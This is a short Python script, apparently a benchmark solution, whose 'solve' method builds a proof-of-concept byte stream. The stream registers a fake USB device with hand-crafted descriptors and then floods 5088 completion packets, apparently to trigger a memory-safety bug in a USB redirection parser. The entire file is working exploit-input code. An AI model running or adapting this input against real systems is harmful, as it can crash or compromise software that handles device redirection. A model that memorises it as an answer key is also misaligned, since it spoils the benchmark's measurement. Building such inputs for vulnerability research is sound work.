import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        device_id = 1
        bus = 0
        devno = 1
        dev_desc = b'\x12\x01\x00\x02\x00\x00\x00\x40\x34\x12\x78\x56\x00\x00\x01\x00\x00\x00\x01'
        num_conf = b'\x01'
        config = b'\x09\x02\x20\x00\x01\x00\x01\xe0\x32'
        interface = b'\x09\x04\x00\x00\x01\xff\x00\x00\x00'
        ep_out = b'\x07\x05\x01\x02\x40\x00\x01'
        ep_in = b'\x07\x05\x81\x02\x40\x00\x01'
        conf_data = config + interface + ep_out + ep_in
        add_data = struct.pack('<HBB', device_id, bus, devno) + dev_desc + num_conf + conf_data
        add_inner = struct.pack('<BB', 1, 0) + add_data
        add_prefix = struct.pack('>I', len(add_inner))
        poc = add_prefix + add_inner
        for i in range(5088):
            urb_id = i + 1
            comp_data = struct.pack('<HIBB', device_id, urb_id, 0, 0)
            comp_inner = struct.pack('<BB', 9, 3) + comp_data
            comp_prefix = struct.pack('>I', len(comp_inner))
            poc += comp_prefix + comp_inner
        return poc